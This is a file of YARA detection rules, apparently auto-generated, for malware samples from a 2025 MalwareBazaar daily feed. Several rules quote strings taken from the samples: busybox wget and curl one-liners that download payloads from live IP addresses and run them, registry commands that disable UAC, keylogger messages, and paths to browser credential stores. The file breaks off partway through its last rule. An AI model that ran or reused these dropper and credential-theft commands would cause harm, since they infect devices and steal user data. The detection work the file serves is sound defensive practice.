rule sig_1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4 {
   meta:
      description = "evidences - file 1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4"
   strings:
      $s1 = "dddddddddssaa.exe" fullword ascii
      $s2 = "Xmonopr" fullword ascii
      $s3 = "A{- )%(" fullword ascii
      $s4 = "RBjqUn2" fullword ascii
      $s5 = "+ 8yE~6" fullword ascii
      $s6 = "lhaive" fullword ascii
      $s7 = "HJEfEC0" fullword ascii
      $s8 = "JpyTw90" fullword ascii
      $s9 = "zJVpJW," fullword ascii
      $s10 = "_TCtDMez" fullword ascii
      $s11 = "pYvUkiA" fullword ascii
      $s12 = "E.kxn>E" fullword ascii
      $s13 = "PPEF]=-" fullword ascii
      $s14 = "?$fRmy_ex" fullword ascii
      $s15 = "*EBoHYrA" fullword ascii
      $s16 = "5IJWq!|" fullword ascii
      $s17 = "ygiU**g" fullword ascii
      $s18 = "5VAiu\\," fullword ascii
      $s19 = "bgLd)QYT" fullword ascii
      $s20 = "F%ARNzJ~G," fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b935c3b0d {
   meta:
      description = "evidences - file fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b935c3b0d.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b935c3b0d"
   strings:
      $s1 = "newww.exe" fullword ascii
      $s2 = "VnY.xco" fullword ascii
      $s3 = "iPiRC5" fullword ascii
      $s4 = "Xmonopr" fullword ascii
      $s5 = "=VSgeT." fullword ascii
      $s6 = "RBjqUn2" fullword ascii
      $s7 = "  -5/xvL" fullword ascii
      $s8 = "vJMZyq8" fullword ascii
      $s9 = "HQfkeLk2" fullword ascii
      $s10 = "# H<`g" fullword ascii
      $s11 = "\\A2%h;" fullword ascii
      $s12 = "ygiU**g" fullword ascii
      $s13 = "zzBS|oO" fullword ascii
      $s14 = "^pvDD\"6" fullword ascii
      $s15 = "Y[idrl{-P" fullword ascii
      $s16 = "~|xusomkhfd``\\\\YY" fullword ascii
      $s17 = "^niwi?" fullword ascii
      $s18 = "wIRhnih" fullword ascii
      $s19 = "%}hxZrRct" fullword ascii
      $s20 = "Y.QSW<" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b {
   meta:
      description = "evidences - file fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b"
   strings:
      $s1 = "BP-50C26_20241220_082241.exe" fullword ascii
      $s2 = "XCoM]Yi" fullword ascii
      $s3 = "Mncghpecpqn" fullword ascii
      $s4 = "hS09* " fullword ascii
      $s5 = "bqylfk" fullword ascii
      $s6 = "J1U*+ 0t" fullword ascii
      $s7 = "F2%pM%c" fullword ascii
      $s8 = "\\XAJnWlz" fullword ascii
      $s9 = "ubYAWf1" fullword ascii
      $s10 = "vh)+ 6A<I" fullword ascii
      $s11 = ">Q* Pc" fullword ascii
      $s12 = "pl>h/#5+ " fullword ascii
      $s13 = "\\A2%h;" fullword ascii
      $s14 = "5VAiu\\," fullword ascii
      $s15 = "^pvDD\"6" fullword ascii
      $s16 = "exGzys^;" fullword ascii
      $s17 = "dXwNI>." fullword ascii
      $s18 = "HPuTD\"Wf`Ef" fullword ascii
      $s19 = "kSOL-\"" fullword ascii
      $s20 = "IoXj%>Qg" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule sig_2d785803be28be5ed48e7c6721eae19a616797161be96f5b64bc540e4fa2199c {
   meta:
      description = "evidences - file 2d785803be28be5ed48e7c6721eae19a616797161be96f5b64bc540e4fa2199c.doc"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "2d785803be28be5ed48e7c6721eae19a616797161be96f5b64bc540e4fa2199c"
   strings:
      $s1 = "OzH2%S|1" fullword ascii
      $s2 = "aOFl?(" fullword ascii
      $s3 = "\\x_B@y" fullword ascii
      $s4 = "zqV&T^b" fullword ascii
      $s5 = ")^}?_g" fullword ascii
      $s6 = "%}-]C;" fullword ascii
      $s7 = "]5n/A," fullword ascii
      $s8 = "i3>&pX/" fullword ascii
      $s9 = "TklE)T" fullword ascii
      $s10 = "<Mgt^@[" fullword ascii
      $s11 = "6k;<\\[~s8r" fullword ascii
      $s12 = "Gm| \"X" fullword ascii
      $s13 = "-50QA/" fullword ascii
      $s14 = ";&s0g@" fullword ascii
      $s15 = " A5)MQ" fullword ascii
      $s16 = " sN?m\"" fullword ascii
      $s17 = "z'lxFh" fullword ascii
      $s18 = "1@83.oD" fullword ascii
      $s19 = "4$F9@$K" fullword ascii
      $s20 = "dhxd1Lv" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 40KB and
      8 of them
}

rule sig_301bf21c15abe0f022ab22093ee05fbead355804d2d04ac892d50b96dc7e1cb3 {
   meta:
      description = "evidences - file 301bf21c15abe0f022ab22093ee05fbead355804d2d04ac892d50b96dc7e1cb3.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "301bf21c15abe0f022ab22093ee05fbead355804d2d04ac892d50b96dc7e1cb3"
   strings:
      $s1 = "su 0 busybox wget http://103.136.41.100/a -O /data/local/tmp/a; su 0 chmod +x /data/local/tmp/a && su 0 sh /data/local/tmp/a" fullword ascii
      $s2 = "su 0 busybox wget http://103.136.41.100/5 -O /data/local/tmp/5; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/5 android" ascii
      $s3 = "su 0 busybox wget http://103.136.41.100/6 -O /data/local/tmp/6; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/6 android" ascii
      $s4 = "su 0 busybox wget http://103.136.41.100/3 -O /data/local/tmp/3;su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/3 android." ascii
      $s5 = "su 0 busybox wget http://103.136.41.100/4 -O /data/local/tmp/4; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/4 android" ascii
      $s6 = "su 0 busybox wget http://103.136.41.100/1 -O /data/local/tmp/1; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/1 android" ascii
      $s7 = "su 0 busybox wget http://103.136.41.100/6 -O /data/local/tmp/6; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/6 android" ascii
      $s8 = "su 0 busybox wget http://103.136.41.100/1 -O /data/local/tmp/1; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/1 android" ascii
      $s9 = "su 0 busybox wget http://103.136.41.100/4 -O /data/local/tmp/4; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/4 android" ascii
      $s10 = "su 0 busybox wget http://103.136.41.100/3 -O /data/local/tmp/3;su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/3 android." ascii
      $s11 = "su 0 busybox wget http://103.136.41.100/2 -O /data/local/tmp/2; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/2 android" ascii
      $s12 = "su 0 busybox wget http://103.136.41.100/5 -O /data/local/tmp/5; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/5 android" ascii
      $s13 = "su 0 busybox wget http://103.136.41.100/2 -O /data/local/tmp/2; su 0 chmod 777 /data/local/tmp/*; su 0 /data/local/tmp/2 android" ascii
      $s14 = "busybox wget http://103.136.41.100/3; chmod 777 3; ./3 android.arm3" fullword ascii
      $s15 = "busybox wget http://103.136.41.100/4; chmod 777 4; ./4 android.arm4" fullword ascii
      $s16 = "busybox wget http://103.136.41.100/1; chmod 777 1; ./1 android.mips" fullword ascii
      $s17 = "busybox wget http://103.136.41.100/5; chmod 777 5; ./5 android.arm5" fullword ascii
      $s18 = "busybox wget http://103.136.41.100/a; chmod 777 a;sh a" fullword ascii
      $s19 = "busybox wget http://103.136.41.100/2; chmod 777 2; ./2 android.mpsl" fullword ascii
      $s20 = "busybox wget http://103.136.41.100/6; chmod 777 6; ./6 android.arm6" fullword ascii
   condition:
      uint16(0) == 0x6b70 and filesize < 4KB and
      8 of them
}

rule sig_348313e26d18c728d3fa29df8f33b204d6ff8da4a0d368877fa8ca6f76f735d0 {
   meta:
      description = "evidences - file 348313e26d18c728d3fa29df8f33b204d6ff8da4a0d368877fa8ca6f76f735d0.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "348313e26d18c728d3fa29df8f33b204d6ff8da4a0d368877fa8ca6f76f735d0"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $x2 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $x3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $s4 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */
      $s5 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" fullword wide
      $s6 = "[+] before ShellExec" fullword ascii
      $s7 = "[+] ShellExec success" fullword ascii
      $s8 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" fullword ascii
      $s9 = "[+] ucmCMLuaUtilShellExecMethod" fullword ascii
      $s10 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii
      $s11 = "rmclient.exe" fullword wide
      $s12 = "Keylogger initialization failure: error " fullword ascii
      $s13 = "[-] CoGetObject FAILURE" fullword ascii
      $s14 = "Offline Keylogger Started" fullword ascii
      $s15 = "Online Keylogger Stopped" fullword ascii
      $s16 = "Offline Keylogger Stopped" fullword ascii
      $s17 = "Online Keylogger Started" fullword ascii
      $s18 = "fso.DeleteFile(Wscript.ScriptFullName)" fullword wide
      $s19 = "Executing file: " fullword ascii
      $s20 = "\\logins.json" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_6197d6bb199187cf7d390f656740be53239a60492534d5c9a623f5ec4c481c74 {
   meta:
      description = "evidences - file 6197d6bb199187cf7d390f656740be53239a60492534d5c9a623f5ec4c481c74.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "6197d6bb199187cf7d390f656740be53239a60492534d5c9a623f5ec4c481c74"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $x2 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $x3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $s4 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */
      $s5 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" fullword wide
      $s6 = "[+] before ShellExec" fullword ascii
      $s7 = "[+] ShellExec success" fullword ascii
      $s8 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" fullword ascii
      $s9 = "[+] ucmCMLuaUtilShellExecMethod" fullword ascii
      $s10 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii
      $s11 = "rmclient.exe" fullword wide
      $s12 = "Keylogger initialization failure: error " fullword ascii
      $s13 = "[-] CoGetObject FAILURE" fullword ascii
      $s14 = "Offline Keylogger Started" fullword ascii
      $s15 = "Online Keylogger Stopped" fullword ascii
      $s16 = "Offline Keylogger Stopped" fullword ascii
      $s17 = "Online Keylogger Started" fullword ascii
      $s18 = "fso.DeleteFile(Wscript.ScriptFullName)" fullword wide
      $s19 = "Executing file: " fullword ascii
      $s20 = "\\logins.json" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_8b30bffd85a7b5743deee0ad43d35c3a855d2693a602d4e86665c02da015a355 {
   meta:
      description = "evidences - file 8b30bffd85a7b5743deee0ad43d35c3a855d2693a602d4e86665c02da015a355.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "8b30bffd85a7b5743deee0ad43d35c3a855d2693a602d4e86665c02da015a355"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $x2 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $x3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $s4 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */
      $s5 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" fullword wide
      $s6 = "[+] before ShellExec" fullword ascii
      $s7 = "[+] ShellExec success" fullword ascii
      $s8 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" fullword ascii
      $s9 = "[+] ucmCMLuaUtilShellExecMethod" fullword ascii
      $s10 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii
      $s11 = "rmclient.exe" fullword wide
      $s12 = "Keylogger initialization failure: error " fullword ascii
      $s13 = "[-] CoGetObject FAILURE" fullword ascii
      $s14 = "Offline Keylogger Started" fullword ascii
      $s15 = "Online Keylogger Stopped" fullword ascii
      $s16 = "Offline Keylogger Stopped" fullword ascii
      $s17 = "Online Keylogger Started" fullword ascii
      $s18 = "fso.DeleteFile(Wscript.ScriptFullName)" fullword wide
      $s19 = "Executing file: " fullword ascii
      $s20 = "\\logins.json" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_87c5727d6f8d8c15808ed2aebc102e8b6c9132d260192a1e6835c8927f38c375 {
   meta:
      description = "evidences - file 87c5727d6f8d8c15808ed2aebc102e8b6c9132d260192a1e6835c8927f38c375.dll"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "87c5727d6f8d8c15808ed2aebc102e8b6c9132d260192a1e6835c8927f38c375"
   strings:
      $x1 = "cmd.exe /B /c \"%s\"" fullword ascii
      $s2 = "GameuxInstallHelper.dll" fullword ascii
      $s3 = "tasklist /FI \"IMAGENAME eq %ProcessName%\" | findstr /I \"%ProcessName%\" >nul" fullword ascii
      $s4 = "pAdvapi32.dll" fullword wide
      $s5 = "MFCMessage.exe" fullword wide
      $s6 = "\\backup.dll" fullword ascii
      $s7 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s8 = "if not exist \"%ProcessPath%\" (" fullword ascii
      $s9 = "    copy /Y \"%BackupProcessPath%\" \"%ProcessPath%\"" fullword ascii
      $s10 = "\\backup.dll\"" fullword ascii
      $s11 = "gAFX_WM_ON_AFTER_SHELL_COMMAND" fullword wide
      $s12 = "\\backup.exe" fullword ascii
      $s13 = "gC:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.42.34433\\atlmfc\\include\\afxwin1.inl" fullword wide
      $s14 = "set \"ProcessName=" fullword ascii
      $s15 = "set \"BackupProcessPath=" fullword ascii
      $s16 = "goto CheckProcess" fullword ascii
      $s17 = "set \"ProcessPath=" fullword ascii
      $s18 = ":CheckProcess" fullword ascii
      $s19 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\oledrop2.cpp" fullword wide
      $s20 = "%s%s%X.tmp" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      1 of ($x*) and 4 of them
}

rule sig_6179f54efa387ff28d8933f2c7d1c4c9b45b66006296e7c7d587f48830acb2d6 {
   meta:
      description = "evidences - file 6179f54efa387ff28d8933f2c7d1c4c9b45b66006296e7c7d587f48830acb2d6.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "6179f54efa387ff28d8933f2c7d1c4c9b45b66006296e7c7d587f48830acb2d6"
   strings:
      $s1 = "OGIwYTNkZmUwZjIxMGMyNjBjOWY4MGJlYjBlZDllZjIxOWJlOGU5OGJlOTBmMTg5" fullword ascii /* base64 encoded string '8b0a3dfe0f210c260c9f80beb0ed9ef219be8e98be90f189' */
      $s2 = "ZjAwMDc0MGI4YjQ1ZjA1MDZhMDllOGJkYjFmY2ZmMzNjMDVhNTk1OTY0ODkxMDY4" fullword ascii /* base64 encoded string 'f000740b8b45f0506a09e8bdb1fcff33c05a595964891068' */
      $s3 = "ZWIxN2U5OTE5OWZkZmY4YjQ1ZmNlOGE5OTRmZGZmZTgwNDllZmRmZmU4NTM5ZWZk" fullword ascii /* base64 encoded string 'eb17e99199fdff8b45fce8a994fdffe8049efdffe8539efd' */
      $s4 = "OGI0MDQ0OGI4MDljMDIwMDAwNTBlODQ1NTlmYWZmZWIwNzhiYzNlOGM4ZDBmZWZm" fullword ascii /* base64 encoded string '8b40448b809c02000050e84559faffeb078bc3e8c8d0feff' */
      $s5 = "MjdmNTcxNDBiNWNkMzIzMTMxNDBlOGYxNTYzMGYwMzAzMGI0Mjk0NTQwYjhhZjMy" fullword ascii /* base64 encoded string '27f57140b5cd32313140e8f15630f03030b4294540b8af32' */
      $s6 = "MzBiN2ZlZmZiMjAxOGI0NjE0ZTg5ZWI0ZmVmZjhiNTM2ODhiYzZlOGIwYmFmZWZm" fullword ascii /* base64 encoded string '30b7feffb2018b4614e89eb4feff8b53688bc6e8b0bafeff' */
      $s7 = "NTgwNDg1ZGI3NDIwOGJmMzhiN2UwODg1ZmY3NDExODM3ZTE0MDA3ZDBiNTdlOGU5" fullword ascii /* base64 encoded string '580485db74208bf38b7e0885ff7411837e14007d0b57e8e9' */
      $s8 = "MDAwMDZhMDBlOGQzNzdmY2ZmOGJkMDhiNDUwODhiNDBiNGU4MmE5ZmZlZmY4YjQ1" fullword ascii /* base64 encoded string '00006a00e8d377fcff8bd08b45088b40b4e82a9ffeff8b45' */
      $s9 = "NDEwMGU4MzFiY2ZiZmZhMzQwYjU0ODAwOGJkNmExNDBiNTQ4MDBlOGNjMDFmZGZm" fullword ascii /* base64 encoded string '4100e831bcfbffa340b548008bd6a140b54800e8cc01fdff' */
      $s10 = "NTNlODQ2MDNmY2ZmODVjMDc0M2VlOGE1ZmNmYmZmM2IwNDI0NzUzNGExMTBiNTQ4" fullword ascii /* base64 encoded string '53e84603fcff85c0743ee8a5fcfbff3b04247534a110b548' */
      $s11 = "ZmNlOGZlNTlmZWZmYzNlOTcwMzhmZWZmZWJmMDViNTk1ZGMzOGJjMDU1OGJlYzUx" fullword ascii /* base64 encoded string 'fce8fe59feffc3e97038feffebf05b595dc38bc0558bec51' */
      $s12 = "Zjg4YmNlOGJkMzhiMThmZjUzM2MzM2MwNWE1OTU5NjQ4OTEwNjhkZjBiNDIwMDhk" fullword ascii /* base64 encoded string 'f88bce8bd38b18ff533c33c05a595964891068df0b42008d' */
      $s13 = "YTZkMDA4MDBiNmQwMDgwMGM4ZDAwODAwZDZkMDA4MDBlOGQwMDgwMGY0ZDAwODAw" fullword ascii /* base64 encoded string 'a6d00800b6d00800c8d00800d6d00800e8d00800f4d00800' */
      $s14 = "Y2EyZTMwMzBiOTM1NTUxYWI4MzIzMTMxMjdmNTcxNDBiNTk4MzIzMTMxNDBlOGYx" fullword ascii /* base64 encoded string 'ca2e3030b935551ab832313127f57140b59832313140e8f1' */
      $s15 = "MjRjNjQ0MjQwNDBiNTQ2YTAwOGIwZDY0NmM0ODAwYjIwMWExMTA1ZDQxMDBlOGU5" fullword ascii /* base64 encoded string '24c64424040b546a008b0d646c4800b201a1105d4100e8e9' */
      $s16 = "NWM2YjQxMDBlOGM3NTlmY2ZmODk0NWY0MzNjMDU1NjgwYTllNDUwMDY0ZmYzMDY0" fullword ascii /* base64 encoded string '5c6b4100e8c759fcff8945f433c055680a9e450064ff3064' */
      $s17 = "MzNjMGEzYTBiNTQ4MDA4MzNkYTRiNTQ4MDAwMDc0MzdhMTljYjU0ODAwNTBlOGU5" fullword ascii /* base64 encoded string '33c0a3a0b54800833da4b54800007437a19cb5480050e8e9' */
      $s18 = "ZDIyNTk5ODYzMWViNDllODczMzExOWNiMjAyZTMwNDBiNjE5NDgzMTMxOTk1NWU4" fullword ascii /* base64 encoded string 'd225998631eb49e8733119cb202e3040b6194831319955e8' */
      $s19 = "YWUwNWMyMGVlMmEzYTBlOGYyNDgwYjU5Y2NlYjc2NzBjZjY0NTFkNGE1NjBiNWFl" fullword ascii /* base64 encoded string 'ae05c20ee2a3a0e8f2480b59cceb7670cf6451d4a560b5ae' */
      $s20 = "ZmZmZjUwOGQ4NWEwZmRmZmZmOGIwYmJhMGNmZDQ3MDBlOGIzNTlmOGZmOGI4NWEw" fullword ascii /* base64 encoded string 'ffff508d85a0fdffff8b0bba0cfd4700e8b359f8ff8b85a0' */
   condition:
      uint16(0) == 0x0000 and filesize < 11000KB and
      8 of them
}

rule sig_35ec4f55228db6d143e8f86de9fdf23f285ce71e3a468bee249361bc8e260f0b {
   meta:
      description = "evidences - file 35ec4f55228db6d143e8f86de9fdf23f285ce71e3a468bee249361bc8e260f0b.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "35ec4f55228db6d143e8f86de9fdf23f285ce71e3a468bee249361bc8e260f0b"
   strings:
      $s1 = "lFkeYTJ" fullword ascii
      $s2 = "JYxeBZ4" fullword ascii
      $s3 = "S$AI/- q" fullword ascii
      $s4 = "EH$%A_p%" fullword ascii
      $s5 = "# ppI<" fullword ascii
      $s6 = "DUvM!p" fullword ascii
      $s7 = "owGj;Ur" fullword ascii
      $s8 = "AMUO&CF" fullword ascii
      $s9 = "uwUW]<-!&6" fullword ascii
      $s10 = "GOSPJL$%" fullword ascii
      $s11 = "kmmE5ML" fullword ascii
      $s12 = "xWIOGQo" fullword ascii
      $s13 = "AUKN^EwE+" fullword ascii
      $s14 = "lT6JZIbZ)]" fullword ascii
      $s15 = "WRRV.}=" fullword ascii
      $s16 = "!Wlyo0_c[u" fullword ascii
      $s17 = "TGIMQ_2" fullword ascii
      $s18 = "6_EidWDTwYwF" fullword ascii
      $s19 = "QKyQ_MPcx" fullword ascii
      $s20 = "RJmU,d2" fullword ascii
   condition:
      uint16(0) == 0xd8ff and filesize < 400KB and
      8 of them
}

rule sig_4176f6ee43565073813008555718f33b4cf16b9af4e2296a504608b1eba955b1 {
   meta:
      description = "evidences - file 4176f6ee43565073813008555718f33b4cf16b9af4e2296a504608b1eba955b1.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "4176f6ee43565073813008555718f33b4cf16b9af4e2296a504608b1eba955b1"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm bins.sh;wget http://51.210.223.35/bins.sh;curl -O http://51.210.223.35/" ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm bins.sh;wget http://51.210.223.35/bins.sh;curl -O http://51.210.223.35/" ascii
      $s3 = "bins.sh;/bin/busybox wget http://51.210.223.35/bins.sh; chmod 777 bins.sh;./bins.sh" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_61bed861502c8356ba044b7f3f920894207767dabc9fcd94896ddd8796cd251b {
   meta:
      description = "evidences - file 61bed861502c8356ba044b7f3f920894207767dabc9fcd94896ddd8796cd251b.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "61bed861502c8356ba044b7f3f920894207767dabc9fcd94896ddd8796cd251b"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm bins.sh;wget http://87.121.86.228/bins.sh;curl -O http://87.121.86.228/" ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm bins.sh;wget http://87.121.86.228/bins.sh;curl -O http://87.121.86.228/" ascii
      $s3 = "bins.sh;/bin/busybox wget http://87.121.86.228/bins.sh; chmod 777 bins.sh;./bins.sh" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_6a5fb1444fbf0226ff37cbfd5dc20028f834914edfe1c33c690c946df52a06fc {
   meta:
      description = "evidences - file 6a5fb1444fbf0226ff37cbfd5dc20028f834914edfe1c33c690c946df52a06fc.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "6a5fb1444fbf0226ff37cbfd5dc20028f834914edfe1c33c690c946df52a06fc"
   strings:
      $s1 = "pkf.RUNh3SI" fullword ascii
      $s2 = "foxjhmt" fullword ascii
      $s3 = "DEBIT NOTE.img" fullword ascii
      $s4 = "eQ9* Vr" fullword ascii
      $s5 = "C.- )x" fullword ascii
      $s6 = "mPcZg63" fullword ascii
      $s7 = "We /Hjd" fullword ascii
      $s8 = "nxbkpn" fullword ascii
      $s9 = "nnudwd" fullword ascii
      $s10 = "3'ZF7* " fullword ascii
      $s11 = "e^,* *5:" fullword ascii
      $s12 = " -@}/0 " fullword ascii
      $s13 = "oyilsl" fullword ascii
      $s14 = "ms30b'}" fullword ascii
      $s15 = "~- BF-" fullword ascii
      $s16 = "gczjkh" fullword ascii
      $s17 = "~=0l -" fullword ascii
      $s18 = "gf.tmu" fullword ascii
      $s19 = "tgBD/#Nej" fullword ascii
      $s20 = "yNrBQ'z" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      8 of them
}

rule sig_83f77b5f103fda69758c8150e74efaef49513da487badd77467bd8876d90683e {
   meta:
      description = "evidences - file 83f77b5f103fda69758c8150e74efaef49513da487badd77467bd8876d90683e.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "83f77b5f103fda69758c8150e74efaef49513da487badd77467bd8876d90683e"
   strings:
      $x1 = "<!-- -->main</span></div></div></span><span data-component=\"trailingVisual\" class=\"prc-Button-Visual-2epfX prc-Button-VisualW" ascii
      $x2 = "  <script type=\"application/json\" data-target=\"react-app.embeddedData\">{\"payload\":{\"allShortcutsEnabled\":false,\"fileTre" ascii
      $x3 = "<!-- -->main</span></div></div></span><span data-component=\"trailingVisual\" class=\"prc-Button-Visual-2epfX prc-Button-VisualW" ascii
      $x4 = "</style><meta data-hydrostats=\"publish\"/> <!-- --> <!-- --> <button hidden=\"\" data-testid=\"header-permalink-button\" data-h" ascii
      $x5 = "  <a id=\"security-tab\" href=\"/Kami32X/Osiris/security\" data-tab-item=\"i5security-tab\" data-selected-links=\"security overv" ascii
      $x6 = "  <a id=\"code-tab\" href=\"/Kami32X/Osiris\" data-tab-item=\"i0code-tab\" data-selected-links=\"repo_source repo_downloads repo" ascii
      $x7 = " Kami32X/Osiris\",\"appPayload\":{\"helpUrl\":\"https://docs.github.com\",\"findFileWorkerPath\":\"/assets-cdn/worker/find-file-" ascii
      $x8 = "            <a href=\"/login?return_to=%2FKami32X%2FOsiris\" rel=\"nofollow\" id=\"repository-details-watch-button\" data-hydro-" ascii
      $x9 = "  <script type=\"application/json\" id=\"client-env\">{\"locale\":\"en\",\"featureFlags\":[\"alive_longer_retries\",\"bypass_cop" ascii
      $x10 = "  <script type=\"application/json\" data-target=\"react-partial.embeddedData\">{\"props\":{\"docsUrl\":\"https://docs.github.com" ascii
      $x11 = "</div><div class=\"d-flex flex-shrink-0 gap-2\"><div data-testid=\"latest-commit-details\" class=\"d-none d-sm-flex flex-items-c" ascii
      $x12 = "thub.com\",\"isGitLfs\":false,\"onBranch\":true,\"shortPath\":\"c2a2ff3\",\"siteNavLoginPath\":\"/login?return_to=https%3A%2F%2F" ascii
      $x13 = " Kami32X/Osiris\" /><meta property=\"og:url\" content=\"https://github.com/Kami32X/Osiris/blob/main/2klz.exe\" /><meta property=" ascii
